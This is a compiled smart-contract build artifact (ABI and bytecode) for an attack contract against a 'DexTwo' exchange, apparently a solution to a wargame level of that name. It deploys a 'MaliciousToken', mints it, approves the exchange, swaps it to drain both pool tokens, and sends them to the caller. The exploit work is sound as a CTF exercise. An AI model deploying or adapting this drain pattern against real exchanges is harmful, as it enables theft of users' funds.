{"abi":[{"type":"constructor","inputs":[{"name":"_dex","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"dex","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract DexTwo"}],"stateMutability":"view"},{"type":"function","name":"malToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract MaliciousToken"}],"stateMutability":"view"},{"type":"function","name":"token1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"token2","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b506040516115c03803806115c083398101604081905261002e9161019f565b5f80546001600160a01b0319166001600160a01b03831617905560405161005490610192565b604051809103905ff08015801561006d573d5f5f3e3d5ffd5b50600180546001600160a01b0319166001600160a01b039283161790555f546040805163d21220a760e01b81529051919092169163d21220a79160048083019260209291908290030181865afa1580156100c9573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100ed919061019f565b600280546001600160a01b0319166001600160a01b039283161790555f54604080516312df092760e11b8152905191909216916325be124e9160048083019260209291908290030181865afa158015610148573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061016c919061019f565b600380546001600160a01b0319166001600160a01b0392909216919091179055506101cc565b610d528061086e83390190565b5f602082840312156101af575f5ffd5b81516001600160a01b03811681146101c5575f5ffd5b9392505050565b610695806101d95f395ff3fe608060405234801561000f575f5ffd5b5060043610610064575f3560e01c80638cef23a81161004d5780638cef23a8146100a95780639e5faafc146100bc578063d21220a7146100c6575f5ffd5b806325be124e14610068578063692058c214610097575b5f5ffd5b60035461007b906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b5f5461007b906001600160a01b031681565b60015461007b906001600160a01b031681565b6100c46100d9565b005b60025461007b906001600160a01b031681565b6002545f80546040516370a0823160e01b81526001600160a01b039182166004820152919216906370a0823190602401602060405180830381865afa158015610124573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101489190610622565b6003545f80546040516370a0823160e01b81526001600160a01b03918216600482015293945090929116906370a0823190602401602060405180830381865afa158015610197573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101bb9190610622565b6001546040516340c10f1960e01b815230600482015261019060248201529192506001600160a01b0316906340c10f19906044015f604051808303815f87803b158015610206575f5ffd5b505af1158015610218573d5f5f3e3d5ffd5b50506001545f546040516340c10f1960e01b81526001600160a01b03918216600482015260646024820152911692506340c10f1991506044015f604051808303815f87803b158015610268575f5ffd5b505af115801561027a573d5f5f3e3d5ffd5b50506001545f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b0391821660048201525f1960248201529116925063095ea7b391506044016020604051808303815f875af11580156102e8573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061030c9190610639565b505f54600154600254604051630df791e560e41b81526001600160a01b0392831660048201529082166024820152606460448201819052919092169163df791e5091015f604051808303815f87803b158015610366575f5ffd5b505af1158015610378573d5f5f3e3d5ffd5b50506001545f546040516340c10f1960e01b81526001600160a01b03918216600482015260c86024820152911692506340c10f1991506044015f604051808303815f87803b1580156103c8575f5ffd5b505af11580156103da573d5f5f3e3d5ffd5b50505f54600154600354604051630df791e560e41b81526001600160a01b039283166004820152908216602482015260c860448201529116925063df791e5091506064015f604051808303815f87803b158015610435575f5ffd5b505af1158015610447573d5f5f3e3d5ffd5b50506002546040516370a0823160e01b81523060048201525f93506001600160a01b0390911691506370a0823190602401602060405180830381865afa158015610493573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104b79190610622565b6003546040516370a0823160e01b81523060048201529192505f916001600160a01b03909116906370a0823190602401602060405180830381865afa158015610502573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105269190610622565b905081156105a25760025460405163a9059cbb60e01b8152336004820152602481018490526001600160a01b039091169063a9059cbb906044016020604051808303815f875af115801561057c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105a09190610639565b505b801561061c5760035460405163a9059cbb60e01b8152336004820152602481018390526001600160a01b039091169063a9059cbb906044016020604051808303815f875af11580156105f6573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061061a9190610639565b505b50505050565b5f60208284031215610632575f5ffd5b5051919050565b5f60208284031215610649575f5ffd5b81518015158114610658575f5ffd5b939250505056fea2646970667358221220b82099cc49105f39e1fc4c0a9d613c73a527aa53bb9fd0be27675f65269d293664736f6c634300081c0033608060405234801561000f575f5ffd5b50604051806040016040528060098152602001684d616c6963696f757360b81b8152506040518060400160405280600381526020016213505360ea1b815250816003908161005d9190610208565b50600461006a8282610208565b5050506100873369d3c21bcecceda100000061008c60201b60201c565b6102e7565b6001600160a01b0382166100e65760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640160405180910390fd5b8060025f8282546100f791906102c2565b90915550506001600160a01b0382165f90815260208190526040812080548392906101239084906102c2565b90915550506040518181526001600160a01b038316905f907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a35050565b505050565b634e487b7160e01b5f52604160045260245ffd5b600181811c9082168061019957607f821691505b6020821081036101b757634e487b7160e01b5f52602260045260245ffd5b50919050565b601f82111561016c57805f5260205f20601f840160051c810160208510156101e25750805b601f840160051c820191505b81811015610201575f81556001016101ee565b5050505050565b81516001600160401b0381111561022157610221610171565b6102358161022f8454610185565b846101bd565b6020601f821160018114610267575f83156102505750848201515b5f19600385901b1c1916600184901b178455610201565b5f84815260208120601f198516915b828110156102965787850151825560209485019460019092019101610276565b50848210156102b357868401515f19600387901b60f8161c191681555b50505050600190811b01905550565b808201808211156102e157634e487b7160e01b5f52601160045260245ffd5b92915050565b610a5e806102f45f395ff3fe608060405234801561000f575f5ffd5b50600436106100cf575f3560e01c806340c10f191161007d578063a457c2d711610058578063a457c2d7146101a0578063a9059cbb146101b3578063dd62ed3e146101c6575f5ffd5b806340c10f191461015b57806370a082311461017057806395d89b4114610198575f5ffd5b806323b872dd116100ad57806323b872dd14610126578063313ce567146101395780633950935114610148575f5ffd5b806306fdde03146100d3578063095ea7b3146100f157806318160ddd14610114575b5f5ffd5b6100db6101fe565b6040516100e891906108b8565b60405180910390f35b6101046100ff36600461091e565b61028e565b60405190151581526020016100e8565b6002545b6040519081526020016100e8565b610104610134366004610946565b6102a7565b604051601281526020016100e8565b61010461015636600461091e565b6102ca565b61016e61016936600461091e565b610308565b005b61011861017e366004610980565b6001600160a01b03165f9081526020819052604090205490565b6100db610316565b6101046101ae36600461091e565b610325565b6101046101c136600461091e565b6103d3565b6101186101d43660046109a0565b6001600160a01b039182165f90815260016020908152604080832093909416825291909152205490565b60606003805461020d906109d1565b80601f0160208091040260200160405190810160405280929190818152602001828054610239906109d1565b80156102845780601f1061025b57610100808354040283529160200191610284565b820191905f5260205f20905b81548152906001019060200180831161026757829003601f168201915b5050505050905090565b5f3361029b8185856103e0565b60019150505b92915050565b5f336102b4858285610537565b6102bf8585856105c7565b506001949350505050565b335f8181526001602090815260408083206001600160a01b038716845290915281205490919061029b9082908690610303908790610a09565b6103e0565b61031282826107dc565b5050565b60606004805461020d906109d1565b335f8181526001602090815260408083206001600160a01b0387168452909152812054909190838110156103c65760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760448201527f207a65726f00000000000000000000000000000000000000000000000000000060648201526084015b60405180910390fd5b6102bf82868684036103e0565b5f3361029b8185856105c7565b6001600160a01b03831661045b5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460448201527f726573730000000000000000000000000000000000000000000000000000000060648201526084016103bd565b6001600160a01b0382166104d75760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f20616464726560448201527f737300000000000000000000000000000000000000000000000000000000000060648201526084016103bd565b6001600160a01b038381165f8181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038381165f908152600160209081526040808320938616835292905220545f1981146105c157818110156105b45760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e636500000060448201526064016103bd565b6105c184848484036103e0565b50505050565b6001600160a01b0383166106435760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f20616460448201527f647265737300000000000000000000000000000000000000000000000000000060648201526084016103bd565b6001600160a01b0382166106bf5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201527f657373000000000000000000000000000000000000000000000000000000000060648201526084016103bd565b6001600160a01b0383165f908152602081905260409020548181101561074d5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e742065786365656473206260448201527f616c616e6365000000000000000000000000000000000000000000000000000060648201526084016103bd565b6001600160a01b038085165f90815260208190526040808220858503905591851681529081208054849290610783908490610a09565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516107cf91815260200190565b60405180910390a36105c1565b6001600160a01b0382166108325760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f20616464726573730060448201526064016103bd565b8060025f8282546108439190610a09565b90915550506001600160a01b0382165f908152602081905260408120805483929061086f908490610a09565b90915550506040518181526001600160a01b038316905f907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a35050565b602081525f82518060208401525f5b818110156108e457602081860181015160408684010152016108c7565b505f604082850101526040601f19601f83011684010191505092915050565b80356001600160a01b0381168114610919575f5ffd5b919050565b5f5f6040838503121561092f575f5ffd5b61093883610903565b946020939093013593505050565b5f5f5f60608486031215610958575f5ffd5b61096184610903565b925061096f60208501610903565b929592945050506040919091013590565b5f60208284031215610990575f5ffd5b61099982610903565b9392505050565b5f5f604083850312156109b1575f5ffd5b6109ba83610903565b91506109c860208401610903565b90509250929050565b600181811c908216806109e557607f821691505b602082108103610a0357634e487b7160e01b5f52602260045260245ffd5b50919050565b808201808211156102a157634e487b7160e01b5f52601160045260245ffdfea26469706673582212200c7186c14be02fab137a630c45522144a746cddb49e368c36c5d70c6ab0eab6f64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","dex()":"692058c2","malToken()":"8cef23a8","token1()":"d21220a7","token2()":"25be124e"},"id":5}